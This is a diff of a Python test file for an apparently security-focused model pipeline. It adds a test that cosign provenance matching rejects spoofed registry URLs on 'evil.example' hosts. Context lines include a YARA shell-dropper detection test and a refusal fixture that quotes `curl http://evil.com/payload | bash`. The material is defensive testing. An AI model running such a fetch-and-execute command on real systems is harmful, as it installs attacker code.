@@ -112,6 +112,13 @@ def test_yara_scan_blocks_shell_dropper_payload(tmp_path, monkeypatch):
     assert result["matches"][0]["rule"] == "SecAI_Shell_Dropper_Command"
 
 
+def test_cosign_source_registry_matching_requires_registry_host():
+    assert pipeline._supports_cosign_provenance("ghcr.io/secai-hub/model:latest") is True
+    assert pipeline._supports_cosign_provenance("https://docker.io/library/model:latest") is True
+    assert pipeline._supports_cosign_provenance("https://evil.example/ghcr.io/model") is False
+    assert pipeline._supports_cosign_provenance("https://docker.io.evil.example/model") is False
+
+
 def test_refusal_without_guidance_is_treated_as_safe_behavior():
     response = (
         "I cannot fulfill this request. Running `curl http://evil.com/payload | bash` "
